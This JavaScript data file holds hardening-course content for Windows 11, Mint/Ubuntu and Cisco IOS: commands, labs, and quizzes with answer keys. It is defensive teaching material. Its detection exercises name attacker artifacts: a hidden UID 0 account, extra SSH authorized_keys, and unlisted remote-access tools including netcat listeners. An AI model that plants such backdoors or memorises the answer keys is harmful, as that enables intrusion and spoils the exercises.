LEVELS.push({
 id:'sophomore', grade:'Sophomore', range:'Beginner to intermediate', color:'var(--l2)', chev:2,
 blooms:['U','A','An'], bloomCap:'Understand and apply. First analysis: reading output and spotting the risky line.',
 intro:'You know the words. Now you do the work: read a scenario brief carefully, harden a Windows 11 machine and a Linux Mint or Ubuntu machine by hand, keep a change log, and configure your first Cisco switch and router. Every unit ends in something you can practice on a VM you own or in Lockdown Range.',
 mentor:['Pair learners on a practice lab with the solution walkthrough closed, then open it together and write down every miss. Those misses become their checklist.','Insist on the change log from the first session. It turns a broken service from a panic into a two-minute undo.','Alternate roles each session: one drives, one reads the scenario brief and verifies each change.','Keep Lockdown Drills and Lockdown Range open next to this page: this page explains why, the drills build speed, the labs put it all together.'],
 units:[
 {id:'s1',title:'Read the scenario brief first',bloom:'Apply',sum:'Read the brief like a contract, learn the six hardening areas, and plan your first twenty minutes.',
  blocks:[
   C('How to read a scenario brief','Understand',
     TIPS('Find and write down: the <b>authorized users</b>, who is an <b>administrator</b>, which <b>services</b> must stay running, which <b>software</b> is allowed or banned, and any <b>investigation questions</b>.',
          'Everything not on the authorized list is suspect. Everything on it is protected: deleting an authorized user or stopping a required service fails an availability check, because you broke something the business needs.',
          'When the brief says "this machine is the company web server", you harden the web server; you do not remove it.',
          'The brief is your scope. If a fix would reach beyond it (another machine, a network you were not given), stop and ask.',
          'Answer investigation questions in the exact format asked (a hash, a file path, a user name). A right answer in the wrong format is a wrong answer.'),
     NOTE('The six hardening areas, each aligned with a CIS Critical Security Control (v8). On any operating system you are always working in one of them. The Hardening scorecard page turns them into a checklist.'),
     {t:'areas'}),
   QUIZ('s1q','Scenario brief: which actions are safe?',[
     ['Brief: "Authorized users: alice, bob, carol. Administrators: alice. The company runs an FTP server for customers." You find user dave with admin rights and a running FTP service.',['Delete dave, remove FTP','Remove dave\u2019s admin rights and delete dave, harden FTP, keep it running','Keep dave, remove FTP','Leave both alone'],1,'dave is not authorized: remove. FTP is required: configure it securely (no anonymous login, strong authentication) but keep it up.'],
     ['Brief: "bob needs Remote Desktop to work from home." Which is the right call?',['Disable Remote Desktop, it is insecure','Keep RDP enabled, require Network Level Authentication, make sure bob is in Remote Desktop Users and the firewall only allows RDP as needed','Delete bob to be safe','Open RDP to everyone'],1,'Required services stay, hardened. Removing one the brief needs is an outage.'],
     ['An investigation question asks: "What is the SHA-256 hash of the file secret.txt on the Desktop?" Your answer should be',['The file size','The MD5 hash, it is shorter','The exact SHA-256 hex string, nothing else','The file contents'],2,'Exact format, exact algorithm. Get-FileHash -Algorithm SHA256 on Windows, sha256sum on Linux.'],
     ['Right after your last change, an availability check fails: the company web site is down. What do you check first?',['The last change you made','The firewall in general','Windows Update','Nothing, keep going'],0,'Last change first; that is what the change log is for. Undo it, confirm the site is back, then find a fix that keeps it running.']
   ]),
   ORDER('s1o','Order the first twenty minutes','Put these in the order a calm team does them. Tap items from the pool to build the sequence.',[
     ['Read the whole scenario brief and investigation questions; write down users, admins, required services','Everything else depends on it. Skipping it is how required services get broken.'],
     ['Record a baseline (users, admins, running services, listening ports) and take a snapshot if allowed','Your before picture. Without it you cannot prove what changed.'],
     ['Assign roles: who works this machine, who logs changes, who verifies','One driver, one scribe. Two people typing on one machine is chaos.'],
     ['Compare users and administrators to the brief','The fastest high-impact wins on any machine; the brief tells you the right answer.'],
     ['Fix accounts: remove unauthorized users, strip extra admins, disable guest, set passwords','Apply the comparison before you forget it.'],
     ['Move to password and lockout policy, then firewall, then updates','The next areas, in rough order of speed and value.']
   ]),
   LINKS('Go further',['cis-controls','nist-csf','t4t-range'])
  ]},
 {id:'s2',title:'Windows 11 hardening',bloom:'Apply',sum:'Accounts, password and lockout policy, firewall, updates, Defender, services, startup, permissions, backups and unauthorized files: by hand.',
  blocks:[
   C('Accounts','Apply',
     CMDS('Users and groups',[
       ['Get-LocalUser | Select-Object Name,Enabled,PasswordRequired','Who exists, who is enabled, who has no password required.'],
       ['Disable-LocalUser -Name Guest','Guest off. Also: net user Guest /active:no'],
       ['Remove-LocalUser -Name mallory','Delete an unauthorized user. Also: net user mallory /delete'],
       ['Remove-LocalGroupMember -Group Administrators -Member dave','Strip admin from an authorized-but-not-admin user. Also: net localgroup Administrators dave /delete'],
       ['Add-LocalGroupMember -Group "Remote Desktop Users" -Member bob','Give exactly the access the scenario brief asks for.'],
       ['net user alice *','Prompt for a new password for an account with a weak or blank one.'],
       ['Set-LocalUser -Name alice -PasswordNeverExpires $false','Follow the same expiry policy as every other account.']
     ])),
   C('Password and lockout policy','Apply',
     P('Open <code>secpol.msc</code> &gt; Account Policies (Pro and above). Or set it from an admin prompt:'),
     CMDS('net accounts',[
       ['net accounts /minpwlen:14 /maxpwage:365 /minpwage:1 /uniquepw:24','Length 14 (the most net accounts accepts), expire after 365 days, no change again for 1 day, remember 24 old passwords.'],
       ['net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15','Lock for 15 minutes after 5 bad tries within 15 minutes.'],
       ['net accounts','Verify. Complexity requirements are only in secpol.msc > Password Policy (set to Enabled).']
     ]),
     NOTE('<b>Standards disagree on passwords, so know both.</b> CIS Benchmarks for Windows recommend a minimum length of 14 or more, history of 24, a maximum age of 365 days or fewer, complexity on, and lockout after 5 or fewer bad tries. NIST SP 800-63B-4 (2025) says a password used on its own must be at least 15 characters, with no composition rules and no forced periodic changes (change it when there is evidence of compromise), and new passwords must be checked against a blocklist of common and breached ones. In a lab, follow the scenario brief; at work, follow your organization\u2019s policy.')),
   C('Firewall, updates, antivirus','Apply',
     CMDS('Three quick wins',[
       ['Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True','All three profiles on. Then check rules in wf.msc for anything allowing everything inbound.'],
       ['Set-NetFirewallProfile -Profile Domain,Private,Public -DefaultInboundAction Block','Default deny inbound, allow outbound (the normal posture).'],
       ['ms-settings:windowsupdate','Run this: Settings > Windows Update. Check for updates and install them.'],
       ['Set-MpPreference -DisableRealtimeMonitoring $false','Defender real-time protection on. Confirm in Windows Security > Virus & threat protection.'],
       ['Update-MpSignature','Pull the latest Defender signatures.']
     ])),
   C('Services, startup, shares, files','Apply',
     CMDS('Find the extras',[
       ['Get-Service | Where-Object Status -eq Running | Select-Object Name,DisplayName,StartType','Running services. Research anything you do not recognize before stopping it.'],
       ['Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled','Example: Print Spooler stopped and disabled on a machine that never prints (Microsoft’s own PrintNightmare workaround). Same pattern for RemoteRegistry, ftpsvc, SNMP when not required.'],
       ['Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess | Sort-Object LocalPort','What is listening. Match PIDs with Get-Process -Id &lt;pid&gt;.'],
       ['Get-ScheduledTask | Where-Object State -ne Disabled | Select-Object TaskName,TaskPath','Scheduled tasks: malware loves these.'],
       ['Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location','Startup entries (Run keys and Startup folders).'],
       ['Get-SmbShare','Shares. Remove ones the scenario brief does not justify: Remove-SmbShare -Name Public'],
       ['Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol','SMBv1 should be Disabled: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart'],
       ['Get-ChildItem -Path C:\\Users -Recurse -Include *.mp3,*.mp4,*.mkv,*.jpg,*.png,*.exe -ErrorAction SilentlyContinue | Select-Object FullName','Media files and odd executables in user folders. Check the brief or the acceptable-use policy for what is unauthorized.'],
       ['appwiz.cpl','Run it: uninstall unauthorized or suspicious programs (games, cracked tools, remote-access tools not in the brief).']
     ])),
   C('Permissions, UAC and backups','Apply',
     CMDS('Check the guard rails',[
       ['icacls "C:\\Shared"','Who can do what to a folder. Look for Everyone or Users with (F) full control or (M) modify where they do not belong.'],
       ['icacls "C:\\Shared" /inheritance:d','Stop inheriting from the parent, keeping copies of the inherited entries so you can edit them.'],
       ['icacls "C:\\Shared" /remove Everyone','Remove the explicit entries for Everyone.'],
       ['icacls "C:\\Shared" /grant "Finance:(OI)(CI)M"','Give the Finance group Modify on the folder and everything inside it. Quote the grant in PowerShell because of the parentheses.'],
       ['secpol.msc','Local Policies > Security Options: "User Account Control: Run all administrators in Admin Approval Mode" should be Enabled (the default).'],
       ['wbadmin start backup -backupTarget:E: -include:C: -allCritical -quiet','Built-in image backup (Windows 11 and Windows Server): back up C: plus everything needed for bare-metal recovery to drive E:.']
     ]),
     TIPS('<b>Backups</b> are their own CIS Control (11: Data Recovery). File History or a backup tool copies personal files to another drive; servers back up volumes and system state. A backup you have never restored is a hope, not a backup.',
          'Snapshots and backups are different: a snapshot rolls a VM back; a backup survives the loss of the disk.')),
   SPOT('s2sp','Spot the problems: net accounts','The brief says to follow the CIS Benchmark. Tap every line that is a finding, then Check.',[
     ['Force user logoff how long after time expires?:       Never',null],
     ['Minimum password age (days):                          0','Users can change a password and immediately change it back, defeating history. CIS: 1 or more.'],
     ['Maximum password age (days):                          Unlimited','Passwords never expire. CIS: 365 or fewer. (NIST SP 800-63B-4 drops forced changes, but this brief follows CIS.)'],
     ['Minimum password length:                              0','Blank passwords allowed. CIS: 14 or more.'],
     ['Length of password history maintained:                None','Old passwords can be reused. CIS: 24.'],
     ['Lockout threshold:                                    Never','Unlimited guesses. CIS: 5 or fewer, but not 0.'],
     ['Lockout duration (minutes):                           30',null],
     ['Lockout observation window (minutes):                 30',null],
     ['Computer role:                                        WORKSTATION',null]
   ]),
   LAB('s2lab','Lab: harden a Windows VM you own','Use a snapshot first. Tick each step as you do it, and write each change in your log.',[
     ['Take a snapshot named "before hardening".',null],
     ['Disable Guest and confirm it shows Enabled: False.','Disable-LocalUser -Name Guest; Get-LocalUser Guest'],
     ['Create a test user, give it admin, then remove the admin membership again.','Add-LocalGroupMember -Group Administrators -Member test; Remove-LocalGroupMember -Group Administrators -Member test'],
     ['Set password length, age, history and lockout, then verify.','net accounts /minpwlen:14 /maxpwage:365 /minpwage:1 /uniquepw:24 /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15; net accounts'],
     ['Enable complexity in secpol.msc > Account Policies > Password Policy.','secpol.msc'],
     ['Turn every firewall profile on with default inbound Block.','Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True -DefaultInboundAction Block'],
     ['Confirm Defender is on and signatures are current.','Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusSignatureLastUpdated'],
     ['List listening ports and explain each one in your log.','Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess'],
     ['Create a folder, break inheritance, and give one group Modify.','icacls "C:\\Shared" /inheritance:d'],
     ['Revert to the snapshot and do it again, faster.',null]
   ]),
   LINKS('Go further',['ms-win-sec','ms-baselines','ms-icacls','ms-sysint','nist-63b','t4t-ld-win11','t4t-lr-win'])
  ]},
 {id:'s3',title:'Linux Mint and Ubuntu hardening',bloom:'Apply',sum:'Users, sudo, passwords, ufw, apt, services, SSH, unauthorized files and snapshots: the Linux half of hands-on hardening.',
  blocks:[
   C('Mint and Ubuntu: same base, different tools','Understand',
     TIPS('<b>Updates.</b> Ubuntu uses Software Updater and <code>unattended-upgrades</code>; Mint uses <b>Update Manager</b>, which can also apply updates automatically (Edit &gt; Preferences &gt; Automation). Both sit on <code>apt</code>, so <code>sudo apt update &amp;&amp; sudo apt upgrade</code> works on either.',
          '<b>Firewall.</b> Both include <code>ufw</code>. Mint adds a graphical Firewall Configuration tool (gufw); Ubuntu Desktop does not install one by default.',
          '<b>Snapshots.</b> Mint\u2019s Update Manager asks you to set up <b>Timeshift</b>, which snapshots system files (home folders are excluded by default). For personal files, use a backup tool such as Ubuntu\u2019s Déjà Dup or Mint\u2019s Backup Tool.',
          '<b>Software.</b> Ubuntu installs some apps as Snaps; Mint disables Snap by default and prefers .deb packages and Flatpak.')),
   C('Accounts and sudo','Apply',
     CMDS('Compare to the scenario brief, then act',[
       ['awk -F: \'$3 >= 1000 && $3 < 65534 {print $1}\' /etc/passwd','Human accounts.'],
       ['getent group sudo','Administrators on Mint/Ubuntu/Debian.'],
       ['sudo deluser --remove-home mallory','Remove an unauthorized user and the home directory. (Generic Linux: sudo userdel -r mallory)'],
       ['sudo gpasswd -d dave sudo','Remove dave from the sudo group (keeps the user).'],
       ['sudo usermod -aG sudo alice','Add alice to sudo. -a (append) matters: without it you replace all her groups.'],
       ['sudo passwd -l hacker','Lock an account you are not sure about instead of deleting it.'],
       ['sudo passwd bob','Set a strong password for an account with a weak one.'],
       ['sudo visudo','Edit sudoers safely. Look for ALL=(ALL) NOPASSWD: ALL and unknown entries, and check /etc/sudoers.d/.']
     ])),
   C('Password policy','Apply',
     CMDS('Aging and quality',[
       ['sudo nano /etc/login.defs','Set PASS_MAX_DAYS 365, PASS_MIN_DAYS 1, PASS_WARN_AGE 7 (or what your policy says). Applies to new accounts.'],
       ['sudo chage -M 365 -m 1 -W 7 alice','Apply the same aging to an existing user. sudo chage -l alice to view.'],
       ['sudo apt install libpam-pwquality','Password quality module.'],
       ['sudo nano /etc/pam.d/common-password','On the pam_pwquality.so line add: retry=3 minlen=14. Add character-class rules (ucredit=-1 and so on) only if your policy requires them; NIST SP 800-63B-4 advises against composition rules.'],
       ['sudo nano /etc/security/faillock.conf','Lockout with pam_faillock (current Ubuntu, Mint and Debian): deny = 5 and unlock_time = 900, then enable pam_faillock as man faillock describes.']
     ]),
     NOTE('Snapshot before PAM edits. A typo in common-password or common-auth can lock everyone out, including you.',true)),
   C('Firewall, updates, services','Apply',
     CMDS('ufw, apt, systemd',[
       ['sudo ufw default deny incoming','Nothing in unless allowed.'],
       ['sudo ufw default allow outgoing','Normal outbound traffic.'],
       ['sudo ufw allow 22/tcp','Only if the brief needs SSH. Same pattern for 80/tcp, 443/tcp.'],
       ['sudo ufw enable','Turn it on. sudo ufw status verbose to confirm.'],
       ['sudo apt update && sudo apt upgrade -y','Patch everything. Check Update Manager (Mint) or Software & Updates (Ubuntu) for sources and automatic updates.'],
       ['sudo apt install unattended-upgrades && sudo dpkg-reconfigure -plow unattended-upgrades','Automatic security updates on.'],
       ['sudo ss -tulnp','Listening TCP and UDP sockets with the owning process.'],
       ['systemctl list-units --type=service --state=running','Running services.'],
       ['sudo systemctl disable --now vsftpd','Stop and disable a service the brief does not need. Then sudo apt purge vsftpd to remove it.'],
       ['sudo apt purge telnetd','Remove clearly insecure packages (telnetd, rsh-server) unless required.'],
       ['sudo timeshift --create --comments "before hardening"','Mint: a system snapshot from the command line before risky changes.']
     ])),
   C('SSH and unauthorized files','Apply',
     CMDS('sshd_config and find',[
       ['sudo nano /etc/ssh/sshd_config','Set PermitRootLogin no, PermitEmptyPasswords no, X11Forwarding no. Keep PasswordAuthentication yes unless the brief says keys only.'],
       ['sudo sshd -t && sudo systemctl restart ssh','Test the config, then restart (service name ssh on Debian/Ubuntu/Mint). Check how the service starts (systemctl status ssh.socket): on Ubuntu 24.04 and Mint 22, ssh.socket holds port 22, so disabling ssh.service does not close it, and a Port change needs sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart ssh.socket.'],
       ['sudo find / -type f \\( -iname "*.mp3" -o -iname "*.mp4" -o -iname "*.mkv" -o -iname "*.jpg" \\) 2>/dev/null','Media files anywhere. Check the brief before deleting.'],
       ['sudo find /home -type f \\( -iname "*.sh" -o -iname "*.py" \\) 2>/dev/null','Scripts in home folders: read them.'],
       ['sudo find / -perm -4000 -type f 2>/dev/null','SUID binaries. Compare to a clean VM; unknown ones are suspicious.'],
       ['ls -la /home/*/.ssh','Extra authorized_keys entries are backdoors.']
     ])),
   SPOT('s3sp','Spot the problems: sshd_config','Tap every line that weakens the server, then Check.',[
     ['Port 22',null],
     ['PermitRootLogin yes','Root can log in over the network with a password. Set no.'],
     ['PubkeyAuthentication yes',null],
     ['PasswordAuthentication yes',null],
     ['PermitEmptyPasswords yes','Accounts with empty passwords can log in. Set no.'],
     ['X11Forwarding yes','Unneeded feature with a long history of abuse. Set no.'],
     ['MaxAuthTries 100','Brute force welcome. Set 3 to 5.'],
     ['UsePAM yes',null],
     ['Subsystem sftp /usr/lib/openssh/sftp-server',null]
   ]),
   SPOT('s3sp2','Spot the problems: /etc/passwd','The brief says the authorized users are alice and bob, and the only administrator is alice. Tap the suspicious lines, then Check.',[
     ['root:x:0:0:root:/root:/bin/bash',null],
     ['daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',null],
     ['alice:x:1000:1000:Alice:/home/alice:/bin/bash',null],
     ['bob:x:1001:1001:Bob:/home/bob:/bin/bash',null],
     ['backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',null],
     ['sysadm:x:0:0::/home/sysadm:/bin/bash','A second UID 0 account. This is root under another name: a backdoor.'],
     ['games:x:5:60:games:/usr/games:/usr/sbin/nologin',null],
     ['tmpuser:x:1002:1002::/home/tmpuser:/bin/bash','Not on the authorized list. Investigate and remove.']
   ]),
   LAB('s3lab','Lab: harden a Mint or Ubuntu VM you own','Snapshot first. Tick each step, log each change.',[
     ['Create a test user, add it to sudo, then remove it from sudo.','sudo adduser test; sudo usermod -aG sudo test; sudo gpasswd -d test sudo'],
     ['Set aging in /etc/login.defs and apply it to your main user with chage.','sudo chage -M 365 -m 1 -W 7 $USER; sudo chage -l $USER'],
     ['Install pwquality and set minlen=14 in common-password, then test by trying a weak password.','sudo apt install libpam-pwquality'],
     ['Default-deny inbound firewall, enable, verify.','sudo ufw default deny incoming; sudo ufw enable; sudo ufw status verbose'],
     ['Patch and turn on unattended upgrades.','sudo apt update && sudo apt upgrade -y'],
     ['List listening sockets and explain each in your log.','sudo ss -tulnp'],
     ['Set PermitRootLogin no, test, restart SSH.','sudo sshd -t && sudo systemctl restart ssh'],
     ['Find all SUID files and media files; note which you would remove and why.','sudo find / -perm -4000 -type f 2>/dev/null']
   ]),
   LINKS('Go further',['ubuntu-server','ubuntu-sec','mint-docs','cis','t4t-ld-mint','t4t-ld-ubuntu','t4t-lr-linux'])
  ]},
 {id:'s4',title:'Services and ports',bloom:'Understand',sum:'Which services are insecure by design, which are insecure by configuration, and how to tell "remove" from "harden".',
  blocks:[
   C('Remove, harden, or keep','Understand',
     TIPS('<b>Insecure by design</b> (clear-text credentials): Telnet (23), FTP (21), rsh/rlogin (512-514), HTTP admin pages. Remove unless the brief requires them; if required, restrict and monitor.',
          '<b>Insecure by configuration</b>: SSH with root login, Samba with guest shares, VNC with no password, RDP without NLA, SNMP with "public". Keep if required, fix the configuration.',
          '<b>Remote access tools</b> not mentioned in the brief (TeamViewer, AnyDesk, VNC, netcat listeners) are usually unauthorized software or malware.',
          'Rule of thumb: if you cannot say what a listening port is for, you are not done with that port.')),
   MATCH('s4m','Match the service to its port','Tap a service, then the port it normally uses.',[
     ['SSH','22'],['Telnet','23'],['FTP','21'],['HTTP','80'],['HTTPS','443'],['DNS','53'],['RDP','3389'],['SMB','445'],['SMTP','25'],['MySQL','3306']
   ]),
   QUIZ('s4q','Check: what would you do?',[
     ['ss -tulnp shows vsftpd listening on 21. Brief: "This machine is a web server." Action?',['Keep it, it is harmless','Disable and remove vsftpd','Change the port to 2121','Add a firewall rule allowing 21'],1,'FTP is not part of the scenario. Remove it, then confirm the web server still works.'],
     ['Brief: "Employees transfer files to this server with FTP." Action?',['Remove FTP anyway','Keep FTP, disable anonymous login, require strong passwords, restrict users to their home directories','Replace it with Telnet','Open FTP to the internet'],1,'Required service: harden it. In vsftpd.conf that means anonymous_enable=NO, local_enable=YES, chroot_local_user=YES.'],
     ['Windows shows a listener on 5900 owned by winvnc.exe, not mentioned in the brief.',['Leave it, VNC is standard','Uninstall it and check startup and scheduled tasks for anything that re-launches it','Only block port 5900 in the firewall','Rename the process'],1,'Unlisted remote-access software is an unauthorized-software or malware finding. Remove it and its persistence.'],
     ['Which is the usual default firewall posture for a workstation or server?',['Block everything in and out','Default deny inbound, allow outbound, open only required inbound ports','Allow everything, the OS handles it','Block outbound only'],1,'Blocking all outbound traffic would break updates, DNS and everything users need. Tighter outbound filtering is possible, but it has to be planned service by service.']
   ]),
   LINKS('Go further',['ubuntu-server','ms-win-sec','cis'])
  ]},
 {id:'s5',title:'Cisco: configure a switch and a router',bloom:'Apply',sum:'The baseline IOS commands for a new switch and router, why each one matters, and how to verify them.',
  blocks:[
   C('Baseline switch configuration','Apply',
     CMDS('From user mode to a saved config',[
       ['enable','User EXEC (>) to privileged EXEC (#).'],
       ['configure terminal','Global configuration mode (config)#.'],
       ['hostname SW1','Match the name in your network documentation exactly; it appears in prompts, logs and neighbor tables.'],
       ['enable secret Cisco123!','Hashed password for privileged mode (never enable password).'],
       ['service password-encryption','Obscures the clear-text line passwords in the config (weak, but better than plain text).'],
       ['banner motd #Authorized access only#','Legal notice. The delimiter character must not appear in the text.'],
       ['line console 0','Then: password Cisco123! and login. exit to leave.'],
       ['line vty 0 15','Remote lines. Then: login local and transport input ssh.'],
       ['username admin secret Cisco123!','Local account used by login local.'],
       ['ip domain-name example.com','Required before generating the SSH key.'],
       ['crypto key generate rsa modulus 2048','SSH key pair.'],
       ['ip ssh version 2','SSH version 2 only.'],
       ['interface vlan 1','Management interface (real networks usually move management off VLAN 1). Then: ip address 192.168.1.2 255.255.255.0 and no shutdown.'],
       ['ip default-gateway 192.168.1.1','So the switch can be managed from other networks.'],
       ['copy running-config startup-config','Save to NVRAM. Unsaved changes vanish on reload.']
     ])),
   C('Baseline router configuration','Apply',
     CMDS('Interfaces and verification',[
       ['interface gigabitethernet0/0/0','Then: description LAN, ip address 192.168.1.1 255.255.255.0, no shutdown.'],
       ['show ip interface brief','Interface status and addresses. up/up is the goal.'],
       ['show running-config','What is configured now. show startup-config is what is saved.'],
       ['show vlan brief','Switch: VLANs and port assignments.'],
       ['show mac address-table','Switch: learned MAC addresses.'],
       ['ping 192.168.1.10','Verify from the device. Also from a PC: ping its gateway.'],
       ['exec-timeout 5 0','Under line console/vty: log out idle sessions after 5 minutes.']
     ])),
   QUIZ('s5q','Check: IOS',[
     ['You configured an IP address on interface vlan 1 but the switch still cannot be pinged. Most likely missing?',['enable secret','no shutdown on the interface','service password-encryption','a banner'],1,'The interface is still down. no shutdown brings it up. Check with show ip interface brief.'],
     ['Which command makes the vty lines use the local username database?',['login','login local','password cisco','transport input ssh'],1,'login alone uses the line password; login local uses username/secret entries.'],
     ['The switch reloaded and your configuration is gone. What was missed?',['enable secret','copy running-config startup-config','show vlan brief','exec-timeout'],1,'The running-config lives in RAM. Save it to NVRAM (the startup-config) or it is lost on reload.'],
     ['Why enable secret rather than enable password?',['It is shorter','enable secret stores a hash; enable password is clear text or weakly reversible','They are the same','enable password is newer'],1,'Config Audit will show you this one in the wild: an enable password line is a finding.']
   ]),
   LINKS('Go further',['t4t-ios','t4t-audit','t4t-ld-ios','t4t-lr-ios','netacad','pt'])
  ]},
 {id:'s6',title:'Investigation questions and the change log',bloom:'Apply',sum:'How to answer exactly, the commands that find things, and the one habit that makes every teammate better.',
  blocks:[
   C('Answering an investigation question','Understand',
     TIPS('Read the whole question twice. Note the <b>exact format</b> requested: hash algorithm, full path or just a name, user name or UID, date format.',
          'Write the answer where the question file asks (often an <code>ANSWER:</code> line), exactly as asked; do not change anything else in that file.',
          'Typical asks: find a file by name or content, hash a file, identify the user who owns or created something, find a process or listening port, decode text, read a log entry.',
          'If it feels like a trick, it is usually a format trick (MD5 vs SHA-256, with or without the extension).'),
     CMDS('Finding and fingerprinting',[
       ['Get-ChildItem -Path C:\\ -Recurse -Filter "secret*" -ErrorAction SilentlyContinue','Windows: find by name. Add -Force to include hidden.'],
       ['Get-FileHash -Algorithm SHA256 C:\\Users\\alice\\Desktop\\secret.txt','Windows hash. -Algorithm MD5 for MD5.'],
       ['Select-String -Path C:\\Users\\*\\*.txt -Pattern "flag"','Windows: search inside text files.'],
       ['Get-WinEvent -LogName Security -MaxEvents 200 | Where-Object Id -eq 4720','Windows: user-created events. 4624 logon, 4625 failed logon, 4732 added to a local group.'],
       ['sudo find / -iname "secret*" 2>/dev/null','Linux: find by name.'],
       ['sudo grep -rin "flag" /home /var/log 2>/dev/null','Linux: find by content, recursive, case-insensitive, with line numbers.'],
       ['sha256sum file.txt','Linux hash. md5sum file.txt for MD5.'],
       ['stat file.txt','Owner, permissions, timestamps.'],
       ['echo "ZmxhZw==" | base64 -d','Decode base64 text.'],
       ['last -n 20','Recent logins. lastlog for the last login of each user. Debian 13 dropped both: use lslogins, or install wtmpdb and lastlog2.']
     ])),
   C('The change log','Apply',
     P('A change log is a text file (on the host, or on paper) with one line per change: <b>time, machine, what you changed, how to undo it</b>. It turns a broken service into a two-minute fix, and it becomes the raw material for your checklist afterward.'),
     TERM('14:07  WIN   Disabled Guest (Disable-LocalUser -Name Guest)   undo: Enable-LocalUser -Name Guest\n14:09  WIN   Removed dave from Administrators                   undo: Add-LocalGroupMember -Group Administrators -Member dave\n14:15  MINT  ufw enable, default deny incoming                  undo: sudo ufw disable\n14:22  MINT  purged vsftpd                                      undo: sudo apt install vsftpd\n14:24  MINT  AVAILABILITY CHECK FAILED -> reinstalled vsftpd; brief says customers use FTP. Harden instead.'),
     TIPS('Log before the Enter key, not after. The habit is the point.','One scribe per machine; the driver says the change out loud.','Keep the undo column honest. "Reinstall" is not an undo if you also deleted the config.')),
   QUIZ('s6q','Check: investigation and logging',[
     ['Question: "What is the MD5 hash of /home/bob/notes.txt?" You answer with sha256sum output. Is that correct?',['Yes, hashes are hashes','No: the question asked for MD5','Only if the file is small','Yes, if you also include the path'],1,'Use the algorithm asked: md5sum /home/bob/notes.txt'],
     ['Which Windows Security event ID means a user account was created?',['4624','4625','4720','4732'],2,'4720 created, 4726 deleted, 4732 added to a local group, 4624 logon, 4625 failed logon.'],
     ['The fastest way to find which change broke a required service is',['Re-read the brief','Your change log, newest entry first','Reboot the machine','Reinstall the operating system'],1,'Newest change first, then undo it and confirm the service is back.'],
     ['Decode: ZmxhZw== (base64)',['flag','frog','file','fail'],0,'echo "ZmxhZw==" | base64 -d prints flag. Investigations often meet base64 in scripts, logs and config files.']
   ]),
   LINKS('Go further',['ms-sysint','explainshell','pico','t4t-range'])
  ]}
 ]
});

LEVELS.push({
 id:'junior', grade:'Junior', range:'Intermediate to advanced', color:'var(--l3)', chev:3,
 blooms:['A','An','E'], bloomCap:'Apply, analyze and evaluate. You judge trade-offs and defend your choices.',
 intro:'Servers and networks. Windows Server with Active Directory and Group Policy, Debian, and Cisco networks with VLANs, inter-VLAN routing and access control lists. You stop following checklists and start reasoning about why one fix beats another.',
 mentor:['Shift from "what" to "why". After each fix ask: which hardening area, which principle, what would break if you did the opposite?','Server topics take the longest. Give Active Directory and Group Policy their own sessions.','Have the learner who owns networking teach VLANs and ACLs back to the group. Teaching is the Analyze level in disguise.','Introduce the Config Audit drill here; evaluating someone else’s config is exactly this grade’s Bloom band.'],
 units:[
 {id:'j1',title:'Windows Server and Active Directory',bloom:'Apply',sum:'Domain controllers, users and groups in AD, and the few server roles you will actually touch.',
  blocks:[
   C('Server is not just a bigger desktop','Understand',
     TIPS('A <b>domain controller</b> (DC) holds Active Directory: the central database of users, groups and computers. On a DC you manage <b>domain</b> accounts, not local ones.',
          '<b>Active Directory Users and Computers</b> (<code>dsa.msc</code>) is where domain users and groups live. A DC has no local accounts database of its own to manage.',
          'Key groups: <b>Domain Admins</b> and <b>Enterprise Admins</b> (full control), <b>Administrators</b>. Strip anyone the scenario brief does not authorize.',
          'Servers often run real services: DNS, DHCP, IIS (web), file shares. Harden what the brief keeps; remove roles it does not mention.'),
     CMDS('AD from PowerShell',[
       ['Get-ADUser -Filter * -Properties Enabled | Select-Object Name,Enabled','Domain users. (Get-LocalUser is for member servers and desktops.)'],
       ['Get-ADGroupMember "Domain Admins"','Who holds the keys to the domain. Compare to the brief.'],
       ['Remove-ADGroupMember -Identity "Domain Admins" -Members dave','Strip an unauthorized domain admin.'],
       ['Disable-ADAccount -Identity guest','Disable an account you are told is unauthorized but must not delete.'],
       ['Set-ADUser -Identity bob -ChangePasswordAtLogon $true','Force a reset for a compromised account.'],
       ['Get-ADDefaultDomainPasswordPolicy','Domain password policy (set in the Default Domain Policy GPO, not secpol).']
     ])),
   C('Server roles and features','Apply',
     CMDS('See and shrink the attack surface',[
       ['Get-WindowsFeature | Where-Object Installed','Every installed role and feature. Remove ones the brief does not justify.'],
       ['Uninstall-WindowsFeature -Name Web-Ftp-Service','Example: remove the FTP role if not required.'],
       ['Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name,DisplayName','Running services, same idea as the desktop.'],
       ['Get-SmbShare | Select-Object Name,Path,Description','File shares. Remove-SmbShare for ones not in the scenario.'],
       ['Get-DnsServerResourceRecord -ZoneName example.com','If it is a DNS server: look for records that do not belong.']
     ])),
   QUIZ('j1q','Check: server and AD',[
     ['On a domain controller, where do you remove a user’s administrative power?',['Local Users and Groups','Active Directory Users and Computers / the right AD group','secpol.msc','Task Manager'],1,'Domain accounts live in AD. Local tools barely apply on a DC.'],
     ['The brief lists Domain Admins as: administrator, alice. You find administrator, alice, eve. Action?',['Delete eve','Remove eve from Domain Admins (delete only if eve is also an unauthorized account)','Leave it','Add everyone to be safe'],1,'Strip the group membership first. Deleting an account the scenario expects elsewhere would break availability for that person.'],
     ['The domain password policy is set in',['secpol.msc on each machine','the Default Domain Policy GPO','each user’s properties','the registry only'],1,'Group Policy at the domain level governs domain accounts. Local policy does not.'],
     ['A server runs the Web-Ftp-Service role, not mentioned in the brief. Best action?',['Keep it','Uninstall the role and confirm the web site (if required) still works','Only firewall it','Rename it'],1,'Remove unneeded roles to shrink the attack surface, then verify required services survive.']
   ]),
   LINKS('Go further',['ms-winsrv','ms-win-sec','cis','stig','t4t-ld-winsrv','t4t-lr-win'])
  ]},
